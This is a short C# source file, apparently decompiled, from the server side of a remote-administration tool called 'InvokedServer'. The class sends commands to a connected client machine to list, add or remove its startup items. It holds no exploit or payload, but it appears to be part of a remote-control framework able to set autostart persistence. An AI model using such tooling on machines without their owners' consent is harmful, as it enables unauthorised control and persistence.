

using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;
using System.Collections.Generic;


namespace InvokedServer.Messages
{
	public class StartupManagerHandler : MessageProcessorBase<List<StartupItem>>
	{
		private readonly InvokedServer.Networking.Client _client;

		public StartupManagerHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message) => message is GetStartupItemsResponse;

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			if (!(message is GetStartupItemsResponse message1))
				return;
			this.Execute(sender, message1);
		}

		public void RefreshStartupItems() => this._client.Send<GetStartupItems>(new GetStartupItems());

		public void RemoveStartupItem(StartupItem item)
		{
			this._client.Send<DoStartupItemRemove>(new DoStartupItemRemove()
			{
				StartupItem = item
			});
		}

		public void AddStartupItem(StartupItem item)
		{
			this._client.Send<DoStartupItemAdd>(new DoStartupItemAdd()
			{
				StartupItem = item
			});
		}

		private void Execute(ISender client, GetStartupItemsResponse message)
		{
			this.OnReport(message.StartupItems);
		}
	}
}